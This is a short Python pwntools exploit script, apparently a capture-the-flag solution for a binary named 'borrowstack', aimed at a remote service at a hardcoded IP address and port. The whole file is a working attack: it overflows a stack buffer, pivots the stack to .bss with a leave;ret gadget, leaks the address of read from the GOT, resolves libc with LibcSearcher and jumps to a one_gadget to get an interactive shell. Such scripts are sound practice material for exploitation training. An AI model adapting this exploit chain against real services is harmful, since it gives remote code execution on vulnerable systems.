from pwn import *
from LibcSearcher import *

context(os="linux", arch="amd64", log_level="debug")
# p = process('./borrowstack')
p = remote('47.100.63.152', 28098)
elf = ELF("./borrowstack")
bss = 0x000601080
pop_rdi = 0x0400703
leave_ret = 0x400699
p.recvuntil('want\n')

payload = 'a'*0x60 + p64(bss+0x50) + p64(leave_ret)
p.send(payload)
bsspayload = '\x00'*0x50 + p64(bss) + p64(pop_rdi) + p64(elf.got['read']) + p64(0x040065B)
p.recvuntil("now!\n")
p.send(bsspayload)
read = u64(p.recv(6).ljust(8,'\x00'))
print(hex(read))

libc = LibcSearcher("read", read)
libcbase = read - libc.dump('read')
gadgetbase = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
one_gadget = libcbase + gadgetbase[2]
payload = p64(0x1) + p64(one_gadget)
# p.recvuntil("want\n")
# p.recvuntil('now!\n')
p.send(payload)
p.recvuntil('now!\n')
p.interactive()
